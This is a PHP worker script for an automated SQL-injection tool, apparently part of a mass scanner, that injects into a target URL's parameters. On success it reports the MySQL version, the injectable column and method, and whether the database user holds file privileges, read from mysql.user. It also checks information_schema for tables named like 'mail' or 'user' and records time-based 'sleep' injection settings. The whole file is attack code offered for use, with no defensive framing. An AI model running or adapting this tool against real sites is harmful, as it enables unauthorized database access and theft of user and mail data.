<?php
error_reporting(0);
set_time_limit(0);


	$mysql = new InjectorComponent();
	$mysql->log_enable=false;
	$mysql->debug =false;
	$url2 = 'URLURL';
	
	$exp = explode('::',$url2);
	if($exp[1] =='https' or $exp[1] =='https://')
	{
		$mysqlInj->https = true;
		$mysqlInj->https_check=true;
	}
	$url = $exp[0];
	
	$url_orig = $url;

	
	if($exp[2] =='post' or $exp[2] =='get')
	{
		$url = $exp[2].'::'.$url;
	}	
	
	
	
	$urls = $mysql->urlParseUrl($url);
		
		
	foreach ($urls as $url_chek)
	{
		$mysql->url = $url_chek;
		
		$test = $mysql->inject($url_chek);

		if($test!==false)
		{
			

			$v = substr($mysql->version, 0,1);

			echo "<url>$url_orig</url>";

			echo '<gurl>'.$url_chek.'</gurl>';
			
			echo '<method>'.$mysql->method.'</method>';

			echo '<version>'.$mysql->version.'</version>';

			echo '<column>'.$mysql->column.'</column>';

			echo '<sposob>'.$mysql->sposob.'</sposob>';

			if($mysql->work==false)
			{	

				echo '<work>'.$mysql->work.'</work>';

			}else
			{
				echo '<work>';

				$work = array_unique($mysql->work);
				
				foreach ($work as $val){
					echo $val.',';
				}
				echo '</work>';
			}
			
			if(intval($v)==5)
			{

				$data = $mysql->mysqlGetValue('mysql','user','file_priv');

				if($data['file_priv']!==false AND trim($data['file_priv'])!=='')
				{
					echo '<filepriv>'.$data['file_priv'].'</filepriv>';
				}else
				{
					echo '<filepriv>false</filepriv>';
				}
				
				echo '<tables>';
				
					$i=0;

					$mysql->table_need = array('mail','user');
				
					foreach ($mysql->table_need as $need)
					{
					
						$count = $mysql->mysqlGetCountInsert('information_schema', 'TABLES','WHERE `TABLE_NAME` LIKE "%'.$need.'%" ');

						if(intval($count)>0)
						{

							if($i!==0)echo ',';

							echo $need;

						}

						$i++;

					}

				echo '</tables>';

			}else
			{

				$data = $mysql->mysqlGetValue('mysql','user','file_priv');

				if($data['file_priv']!==false)
				{

					echo '<filepriv>'.$data['file_priv'].'</filepriv>';

				}else
				{

					echo '<filepriv>false</filepriv>';

				}

			}
			
			if($mysql->sleep_metod == true)
			{
			 $set1['tp']=$mysql->set['sleep']['flt']['tp']; 
			 $set1['qt']=$mysql->set['sleep']['flt']['qt'];
			 $set1['sp']=$mysql->set['sleep']['flt']['sp'];
			 $set1['ed']=$mysql->set['sleep']['flt']['ed'];
			 $set1['an']=$mysql->set['sleep']['flt']['an'];
			 $set1['nl']=$mysql->set['sleep']['flt']['nl'];
			 $set1['sq']=$mysql->set['sleep']['flt']['sq'];
			 $set1['sl']=$mysql->set['sleep']['flt']['sl'];
		
			 $set1['scb']= $mysql->set['sleep']['scb'];
			 $set1['coment']= $mysql->set['sleep']['coment'];
			 $set1['outp']= $mysql->set['sleep']['outp'];
			 $set1['hex']= $mysql->set['sleep']['hex'];
			 $set1['key'] = $mysql->ret['sleep']['key'];
			 $set1['val'] = $mysql->ret['sleep']['val'];
			 
			 $mysql->sleep_data = serialize($set1);
			 
			}else
			{
			
				$mysql->sleep_data = 0;
			}
			
				echo '<sleep>'.$mysql->sleep_data.'</sleep>';
			
			
			die();
		}
		
	}
	
	echo 'falze::'.$url_orig;
	//print_r();

?>				